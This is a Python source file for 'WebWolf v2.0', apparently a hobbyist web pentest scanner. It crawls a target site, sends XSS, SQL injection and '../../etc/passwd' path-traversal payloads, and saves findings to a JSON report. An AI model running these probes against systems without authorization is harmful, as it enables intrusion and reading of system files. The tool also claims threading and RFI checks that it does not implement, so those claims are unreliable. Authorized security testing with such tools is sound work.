#!/usr/bin/env python3
"""
WebWolf v2.0 - Ultimate Web Application Pentest Suite
Author: Black Wolf (wtheblack6) - November 2025
From SmartScanner victim → Creator of the real deal
GitHub: https://github.com/wtheblack6/WebWolf
"""

import argparse
import requests
import threading
import json
import time
import sys
import re
import os
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import subprocess

init(autoreset=True)

class WebWolf:
    def __init__(self, args):
        self.target = args.target.rstrip("/")
        self.threads = args.threads
        self.aggressive = args.aggressive
        self.output = args.output
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "WebWolf/2.0 (+https://github.com/wtheblack6/WebWolf)"})
        self.vulns = []
        self.crawled = set()
        self.forms = []
        self.js_endpoints = []

    def banner(self):
        print(f"""
{Fore.RED}    ╔═══════════════════════════════════════╗
    ║              WEBWOLF v2.0             ║
    ║       Advanced Web Pentest Suite      ║
    ║        by Black Wolf (wtheblack6)     ║
    ╚═══════════════════════════════════════╝{Style.RESET_ALL}
        Target → {Fore.CYAN}{self.target}{Style.RESET_ALL}
        Mode   → {Fore.RED if self.aggressive else Fore.YELLOW}{"AGGRESSIVE" if self.aggressive else "STANDARD"}{Style.RESET_ALL}
        """)

    def crawl(self):
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Crawling website...")
        queue = [self.target]
        while queue:
            url = queue.pop(0)
            if url in self.crawled or len(self.crawled) > 1000:
                continue
            try:
                r = self.session.get(url, timeout=10)
                self.crawled.add(url)
                soup = BeautifulSoup(r.text, 'html.parser')

                # Extract forms
                for form in soup.find_all("form"):
                    self.forms.append({
                        "url": url,
                        "action": urljoin(url, form.get("action", "")),
                        "method": form.get("method", "get").upper(),
                        "inputs": [i.get("name") for i in form.find_all("input") if i.get("name")]
                    })

                # Extract JS endpoints
                for script in soup.find_all("script", src=True):
                    js_url = urljoin(url, script["src"])
                    self.js_endpoints.append(js_url)

                # Links
                for a in soup.find_all("a", href=True):
                    link = urljoin(url, a["href"])
                    if self.target in link and link not in self.crawled and link not in queue:
                        queue.append(link)
            except:
                continue

    def test_xss(self):
        payloads = [
            '<script>alert("WebWolf")</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>'
        ]
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Testing XSS...")
        for url in list(self.crawled)[:50]:
            params = parse_qs(urlparse(url).query)
            for param in params:
                for payload in payloads:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    try:
                        r = self.session.get(test_url, timeout=5)
                        if payload in r.text or "WebWolf" in r.text:
                            self.vuln("XSS", test_url, payload, "High")
                    except:
                        pass

    def test_sqli(self):
        payloads = ["'", "1' OR '1'='1", "1 UNION SELECT 1,2,3-- -"]
        errors = ["sql syntax", "mysql_fetch", "ORA-", "PostgreSQL"]
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Testing SQL Injection...")
        for url in list(self.crawled)[:50]:
            for payload in payloads:
                test_url = url + payload if "?" in url else url + "?id=1" + payload
                try:
                    r = self.session.get(test_url, timeout=5)
                    if any(err.lower() in r.text.lower() for err in errors):
                        self.vuln("SQL Injection", test_url, payload, "Critical")
                except:
                    pass

    def test_lfi(self):
        payloads = ["../../../../etc/passwd", "....//....//etc/passwd"]
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Testing LFI/RFI...")
        for url in list(self.crawled):
            if "file=" in url or "page=" in url or "include=" in url:
                for payload in payloads:
                    test_url = url.split("=")[0] + "=" + payload
                    r = self.session.get(test_url, timeout=5)
                    if "root:x:" in r.text or "bin/bash" in r.text:
                        self.vuln("Local File Inclusion", test_url, payload, "Critical")

    def vuln(self, type_, url, payload, risk):
        v = {"type": type_, "url": url, "payload": payload, "risk": risk, "time": time.strftime("%H:%M:%S")}
        self.vulns.append(v)
        color = Fore.RED if risk in ["High", "Critical"] else Fore.YELLOW
        print(f"{color}[!] {risk} → {type_}{Style.RESET_ALL} | {url}")

    def report(self):
        os.makedirs("reports", exist_ok=True)
        name = f"reports/WebWolf_{urlparse(self.target).netloc}_{int(time.time())}"
        with open(f"{name}.json", "w") as f:
            json.dump({
                "tool": "WebWolf v2.0",
                "author": "Black Wolf (wtheblack6)",
                "target": self.target,
                "vulnerabilities": self.vulns,
                "crawled_pages": len(self.crawled),
                "forms_found": len(self.forms)
            }, f, indent=2)
        print(f"\n{Fore.GREEN}[+] Report saved → {name}.json{Style.RESET_ALL}")

    def run(self):
        self.banner()
        self.crawl()
        self.test_xss()
        self.test_sqli()
        if self.aggressive:
            self.test_lfi()
        self.report()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WebWolf v2.0 - Ultimate Web Pentest Suite")
    parser.add_argument("target", help="Target URL (e.g. http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Threads (default: 20)")
    parser.add_argument("--aggressive", action="store_true", help="Enable LFI/RFI and advanced checks")
    parser.add_argument("-o", "--output", default="webwolf", help="Output prefix")
    args = parser.parse_args()

    wolf = WebWolf(args)
    wolf.run()
